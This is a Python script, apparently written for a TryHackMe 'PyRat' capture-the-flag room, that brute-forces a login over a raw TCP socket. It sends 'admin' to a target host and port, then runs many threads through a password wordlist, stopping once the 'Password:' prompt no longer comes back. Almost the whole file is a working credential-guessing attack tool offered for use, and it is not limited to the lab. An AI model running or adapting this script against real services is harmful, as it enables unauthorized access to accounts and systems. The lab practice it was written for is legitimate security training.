import socket
import argparse
from threading import Event
from rich import console
from concurrent.futures import ThreadPoolExecutor, as_completed

class pass_brute:
    def __init__(self, args, stop_event):
        self.target = args.target
        self.port = args.port
        self.wordlist = args.wordlist
        self.no_color = args.no_color
        self.threads = int(args.threads)
        self.stop_event = stop_event  # Store stop_event in class

    def connect(self):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            sock.connect((self.target, self.port))
            return sock
        except TimeoutError:
            print("Connection Error: Couldn't connect to the target")
            exit(0)
            
        except socket.gaierror as sgE:
            print(f"Error: {sgE}")
            exit(0)
        
        except Exception as e:
            print(f"Error: {e}")
            exit(0)

    def passbrute(self, password):
        if self.stop_event.is_set():  # Stop brute-force if event is set
            return
        
        socket = self.connect()
        socket.send(f"admin\n".encode())
        connection_result = socket.recv(1024)

        if "Password:" in connection_result.decode():
            socket.send(f"{password}\n".encode())
            response = socket.recv(1024)

            if "Password:" not in response.decode():
                print(f"\n[+] Password Found: {password}")
                self.stop_event.set()  # Signal all threads to stop
                return password  # Return result

            else:
                socket.close()

    def passbrute_handler(self):
        socket = self.connect()
        socket.close()
        tasks = []

        try:
            with ThreadPoolExecutor(max_workers=self.threads) as Threads:
                try:
                    with open(self.wordlist, "r") as wordlist:
                        for password in wordlist:
                            if self.stop_event.is_set():  # Stop submitting if password is found
                                break
                            tasks.append(Threads.submit(self.passbrute, password.strip()))
                except FileNotFoundError:
                    print(f"Wordlist not found: {self.wordlist}")
                    exit(0)
                    
                for task in as_completed(tasks):  # Wait for all tasks
                    if task.result() is not None:
                        break

        except KeyboardInterrupt:
            print("\n[!] Exiting...")
            self.stop_event.set()
            exit(0)

    def start(self):
        self.passbrute_handler()

class cli:
    def banner(self, args):
        if args.no_color:
            print("-" * 50)
            print("|          PyRat THM Password BruteForce          |")   
            print("|          .............................          |") 
            print("|  Author: PkTheHacker10                          |")
            print("|  Version: 1.0                                   |")
            print("|  Github:                                        |")    
            print("-" * 50)     
        else:
            console.print("""
                                        ___.                 __          
            ___________    ______ ______ \\_ |_________ __ ___/  |_  ____  
            \\____ \\__  \\  /  ___//  ___/  | __ \\_  __ \\  |  \\   __\\/ __ \\ 
            |  |_> > __ \\_\\___ \\ \\___ \\   | \\_\\ \\  | \\/  |  /|  | \\  ___/ 
            |   __(____  /____  >____  >  |___  /__|  |____/ |__|  \\___  >
            |__|       \\/     \\/     \\/       \\/                       \\/ 
                """, style="bold blue")
            print("Author: PkTheHacker10")
            print("Version: 1.0")
            print("Github:")    
            print("-" * 50)

    def argsparser(self):
        argsparser = argparse.ArgumentParser(add_help=False, usage=argparse.SUPPRESS, exit_on_error=False)
        argsparser.add_argument("-t", "--target", required=True)
        argsparser.add_argument("-p", "--port",type=int, required=True)
        argsparser.add_argument("-w", "--wordlist", required=True)
        argsparser.add_argument("-T", "--threads", default=40)
        argsparser.add_argument("-nc", "--no-color", action="store_true")
        args = argsparser.parse_args()
        return args

if __name__ == "__main__":
    console = console.Console()
    stop_event = Event()
    cli = cli()
    args = cli.argsparser()
    cli.banner(args)
    console.log("Starting Password BruteForce Attack...")
    
    password_bruteforce = pass_brute(args, stop_event)
    password_bruteforce.start()
